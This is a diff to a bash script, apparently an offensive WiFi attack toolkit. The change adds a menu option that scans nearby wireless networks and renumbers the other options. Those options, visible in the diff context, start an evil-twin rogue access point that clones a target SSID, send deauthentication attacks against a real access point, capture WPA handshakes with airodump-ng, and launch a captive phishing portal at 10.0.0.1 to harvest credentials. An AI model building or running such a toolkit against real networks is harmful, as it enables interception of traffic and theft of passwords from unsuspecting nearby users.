@@ -76,7 +76,24 @@ listen-address=10.0.0.1
 EOF
 }
 
-#---- 1. Start Evil Twin AP ----#
+#---- 1. scan WiFi insterfaces ----#
+
+function scan_wifi_interfaces_and_networks() {
+    echo -e "${CYAN}Available wireless interfaces:${NC}"
+    iw dev 2>/dev/null | awk '/Interface/ {print " - " $2}'
+    echo
+    echo -e "${CYAN}Scanning for nearby WiFi networks (may take a few seconds):${NC}"
+    for iface in $(iw dev 2>/dev/null | awk '/Interface/ {print $2}'); do
+        echo -e "${YELLOW}[Interface: $iface]${NC}"
+        sudo iw "$iface" scan | grep -E 'SSID:|primary channel' | awk '
+            /primary channel:/ {chan=$3}
+            /SSID:/ {printf "  SSID: %-30s Channel: %s\n", substr($0, index($0,$2)), chan}'
+    done
+    echo
+    read -p "Press Enter to return to menu..."
+}
+
+#---- 2. Start Evil Twin AP ----#
 function start_rogue_ap(){
     prompt_iface
     read -p "SSID to Clone (target): " FAKESSID
@@ -103,7 +120,7 @@ function start_rogue_ap(){
     echo -e "${GREEN}[+] Evil Twin running, captive portal accessible at 10.0.0.1${NC}"
 }
 
-#---- 2. Deauth ----#
+#---- 3. Deauth ----#
 function deauth_attack() {
     prompt_iface
     read -p "AP BSSID (target): " BSSID
@@ -122,7 +139,7 @@ function deauth_attack() {
     fi
 }
 
-#---- 3. Handshake Capture ----#
+#---- 4. Handshake Capture ----#
 function handshake_capture() {
     prompt_iface
     read -p "AP BSSID (target): " BSSID
@@ -133,7 +150,7 @@ function handshake_capture() {
     sudo airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUTFILE" "$IFACE"
 }
 
-#---- 4. Phishing Portal ----#
+#---- 5. Phishing Portal ----#
 function phishing_portal() {
     echo -e "${CYAN}[*] Launching captive portal at http://10.0.0.1 ...${NC}"
     cd "$PHISH_PORTAL"
@@ -144,23 +161,25 @@ function phishing_portal() {
     pkill -f "python3 $PHISH_PORTAL/server.py"
 }
 
-#---- 5. Menu/Teardown ----#
+#---- 6. Menu/Teardown ----#
 while true; do
     banner
-    echo -e "${BLUE}1) Start Rogue AP (Evil Twin)${NC}"
-    echo -e "${BLUE}2) Deauth client(s) from real AP${NC}"
-    echo -e "${BLUE}3) Capture WPA Handshake (.cap)${NC}"
-    echo -e "${BLUE}4) Launch Captive Phishing Portal${NC}"
-    echo -e "${BLUE}5) SAFE TEARDOWN/RESET${NC}"
-    echo -e "${BLUE}6) Exit${NC}"
-    echo -ne "${CYAN}Your choice [1-6]: ${NC}"; read CHOICE
+    echo -e "${BLUE}1) Scan WiFi interfaces & networks${NC}"
+    echo -e "${BLUE}2) Start Rogue AP (Evil Twin)${NC}"
+    echo -e "${BLUE}3) Deauth client(s) from real AP${NC}"
+    echo -e "${BLUE}4) Capture WPA Handshake (.cap)${NC}"
+    echo -e "${BLUE}5) Launch Captive Phishing Portal${NC}"
+    echo -e "${BLUE}6) SAFE TEARDOWN/RESET${NC}"
+    echo -e "${BLUE}7) Exit${NC}"
+    echo -ne "${CYAN}Your choice [1-7]: ${NC}"; read CHOICE
     case $CHOICE in
-        1) start_rogue_ap ;;
-        2) deauth_attack ;;
-        3) handshake_capture ;;
-        4) phishing_portal ;;
-        5) cleanup ;;
-        6) echo -e "${GREEN}Bye!${NC}"; exit 0 ;;
+        1) scan_wifi_interfaces_and_networks ;;
+        2) start_rogue_ap ;;
+        3) deauth_attack ;;
+        4) handshake_capture ;;
+        5) phishing_portal ;;
+        6) cleanup ;;
+        7) echo -e "${GREEN}Bye!${NC}"; exit 0 ;;
         *) echo -e "${RED}[!] Invalid option.${NC}" ;;
     esac
     read -p "Press Enter to return to menu..."
